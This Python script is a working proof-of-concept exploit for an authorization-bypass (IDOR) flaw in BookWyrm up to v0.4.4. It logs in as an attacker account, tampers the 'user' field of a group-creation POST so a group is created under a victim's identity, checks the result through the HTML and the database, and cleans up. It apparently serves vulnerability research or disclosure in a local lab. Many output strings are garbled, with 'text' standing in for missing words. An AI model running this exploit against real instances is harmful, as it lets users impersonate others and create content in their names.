                      
""

import sys
import re
import subprocess
import requests
from bs4 import BeautifulSoup

REPO_PATH    = "/home/ground/Desktop/BAC/cve-app/bookwyrm/bookwyrm"
COMPOSE_FILE = f"{REPO_PATH}/docker-compose.yml"
COMPOSE_OVR  = f"{REPO_PATH}/docker-compose.override.yml"

CONFIG = {
    "base_url":          "http://192.168.115.88:8800",
    "user1_localname":   "usera",
    "user1_password":    "userApass1",
    "user2_localname":   "userb",
    "user2_password":    "userBpass1",
    "group_name":        "IDOR-PoC-Group",
    "group_description": "text IDOR text PoC Create，textHastextVictimtext",
    "group_privacy":     "public",
}


def run_shell(code):
    ""
    cmd = [
        "docker", "compose",
        "-f", COMPOSE_FILE, "-f", COMPOSE_OVR,
        "exec", "-T", "web",
        "python", "manage.py", "shell", "-c", code,
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=REPO_PATH)
    return [l for l in result.stdout.splitlines()
            if l.strip() and "warning" not in l.lower() and "warn" not in l.lower()]


def get_csrf(session, url):
    resp = session.get(url)
    resp.raise_for_status()
    token = session.cookies.get("csrftoken")
    if not token:
        soup = BeautifulSoup(resp.text, "html.parser")
        tag = soup.find("input", {"name": "csrfmiddlewaretoken"})
        token = tag["value"] if tag else None
    return token


def login(base_url, localname, password):
    session = requests.Session()
    csrf = get_csrf(session, base_url + "/login/")
    if not csrf:
        print(f"[ERROR] NonetextGet CSRF Token")
        sys.exit(1)
    session.post(base_url + "/login/", data={
        "csrfmiddlewaretoken": csrf,
        "localname": localname,
        "password":  password,
    }, allow_redirects=True)
    if "sessionid" not in session.cookies:
        print(f"[ERROR] {localname} Login failed")
        sys.exit(1)
    print(f"[+] {localname} Login succeeded，sessionid={session.cookies['sessionid'][:16]}...")
    return session, get_csrf(session, base_url + "/")


def get_user_id(session, base_url, localname):
    resp = session.get(f"{base_url}/user/{localname}")
    if resp.status_code == 404:
        print(f"[ERROR] User {localname} text 404")
        sys.exit(1)
    soup = BeautifulSoup(resp.text, "html.parser")
    for tag in soup.find_all(True):
        for attr in ("action", "href"):
            val = tag.get(attr, "")
            for kw in ("/block/", "/unblock/", "/report/"):
                if kw in val:
                    candidate = val.strip("/").split("/")[-1]
                    if candidate.isdigit():
                        print(f"[+] text {localname} text ID = {candidate}")
                        return int(candidate)
    print(f"[ERROR] Nonetext {localname} text ID")
    sys.exit(1)


def create_group_as_victim(session, base_url, csrf, attacker_localname,
                           victim_user_id, group_name, group_desc, group_privacy):
    ""
    endpoint = f"{base_url}/user/{attacker_localname}/groups/"
    payload = {
        "csrfmiddlewaretoken": csrf,
        "user":        victim_user_id,
        "name":        group_name,
        "description": group_desc,
        "privacy":     group_privacy,
    }
    print(f"\n[*] Step 3 — text IDOR：User1 textVictimIdentityCreategroup")
    print(f"    POST {endpoint}")
    print(f"    user（tamperingtextVictim ID）= {victim_user_id}")
    resp = session.post(endpoint, data=payload, allow_redirects=False)
    print(f"\n[*] textResponsetext：{resp.status_code}")
    return resp


def get_group_id_from_redirect(location):
    match = re.search(r"/group/(\d+)", location or "")
    return int(match.group(1)) if match else None


def check_group_owner_db(group_name, victim_localname):
    ""
    lines = run_shell(f"""
from bookwyrm.models import Group, User
victim = User.objects.get(localname='{victim_localname}')
g = Group.objects.filter(name='{group_name}').order_by('-id').first()
if g is None:
    print('GROUP_NOT_FOUND')
elif g.user_id == victim.id:
    print('OWNER_IS_VICTIM')
else:
    print('OWNER_NOT_VICTIM')
""")
    return next(
        (l for l in lines if l in ("OWNER_IS_VICTIM", "OWNER_NOT_VICTIM", "GROUP_NOT_FOUND")),
        "UNKNOWN"
    )


def verify_and_report(session, base_url, group_id, group_name,
                      victim_localname, attacker_localname):
    ""
                                                          
    html_positive = False
    if group_id:
        resp = session.get(f"{base_url}/group/{group_id}")
        html_positive = f"/user/{victim_localname}" in resp.text

                                                            
    db_verdict = check_group_owner_db(group_name, victim_localname)
    db_positive = (db_verdict == "OWNER_IS_VICTIM")

    if html_positive or db_positive:
        print("\n[!!! text !!!]")
        if html_positive:
            print(f"    [HTML layer] grouptext /user/{victim_localname}（Victimtextowner）。")
        if db_positive:
            print(f"    [DB layer]   Group.user == {victim_localname}（DB direct DB confirmation）。")
        print(f"    Root cause：UserGroups.post()（bookwyrm/views/group.py）")
        print(f"          GroupForm text user text POST text，textVerifyYesNotext request.user。")
        return True
    else:
        print("\n[✓ text]")
        print(f"    [HTML layer] grouptextVictim {victim_localname} text。")
        print(f"    [DB layer]   Group.user != {victim_localname}（{db_verdict}）。")
        if db_verdict == "GROUP_NOT_FOUND":
            print(f"    Requesttext，grouptextCreate。")
        else:
            print(f"    groupownertext request.user（{attacker_localname}）。")
        return False


def cleanup_poc_groups_db(group_name):
    ""
    lines = run_shell(f"""
from bookwyrm.models import Group
n, _ = Group.objects.filter(name='{group_name}').delete()
print(f'db_cleaned={{n}}')
""")
    cleaned = next((l for l in lines if l.startswith("db_cleaned=")), "")
    if cleaned:
        n = cleaned.split("=")[-1]
        if n != "0":
            print(f"[+] DB text {n} text PoC group")


def main():
    base = CONFIG["base_url"]
    print("=" * 62)
    print("  BookWyrm Nonetext CVE-2 — IDOR text PoC")
    print("  CWE-639: Authorization Bypass Through User-Controlled Key")
    print("  text：<= v0.4.4")
    print("=" * 62)

    print(f"\n[Step 1] User1（Attacker）text...")
    session1, csrf1 = login(base, CONFIG["user1_localname"], CONFIG["user1_password"])

    print(f"\n[Step 1b] User2（Victim）text...")
    session2, csrf2 = login(base, CONFIG["user2_localname"], CONFIG["user2_password"])

    print(f"\n[Step 2] User1 text User2（{CONFIG['user2_localname']}）text ID...")
    victim_id = get_user_id(session1, base, CONFIG["user2_localname"])

    resp = create_group_as_victim(
        session1, base, csrf1, CONFIG["user1_localname"], victim_id,
        CONFIG["group_name"], CONFIG["group_description"], CONFIG["group_privacy"])

                                                
    if resp.status_code not in (200, 302):
        print(f"\n[✓ Vulnerability fixed]")
        print(f"    textRequest（Responsetext：{resp.status_code}），user texttamperingtext。")
                              
        cleanup_poc_groups_db(CONFIG["group_name"])
        print("\n[Complete] PoC textEnd。")
        return

    location = resp.headers.get("Location", "")
    group_id = get_group_id_from_redirect(location)
    if group_id:
        print(f"\n[Step 4] text 302 text → {location}")
        print(f"[+] textgroup ID = {group_id}")
    else:
        print(f"[!] Nonetext Location={location!r} textgroup ID，text DB  layerCheck")

    print(f"\n[Step 5] text layer oracle：VerifygroupownerIdentity...")
    verify_and_report(
        session1, base, group_id, CONFIG["group_name"],
        CONFIG["user2_localname"], CONFIG["user1_localname"])

    print("\n[Complete] PoC textEnd。")

    print("\n" + "─" * 62)
    print("[Teardown] Delete PoC Creation，textStatus...")
    if group_id:
        csrf1 = get_csrf(session1, base + "/")
        del_resp = session1.post(f"{base}/group/delete/{group_id}/",
                                 data={"csrfmiddlewaretoken": csrf1}, allow_redirects=False)
        if del_resp.status_code in (200, 302):
            print(f"[+] deletedgroup id={group_id}（text session1）")
        else:
                                     
            csrf2 = get_csrf(session2, base + "/")
            del_resp2 = session2.post(f"{base}/group/delete/{group_id}/",
                                      data={"csrfmiddlewaretoken": csrf2}, allow_redirects=False)
            if del_resp2.status_code in (200, 302):
                print(f"[+] deletedgroup id={group_id}（text session2）")
            else:
                print(f"[!] HTTP Deletion failed，text DB text")
    cleanup_poc_groups_db(CONFIG["group_name"])
    print("[Teardown] Complete，text PoC RuntextStatus。")
    print("─" * 62)


if __name__ == "__main__":
    main()
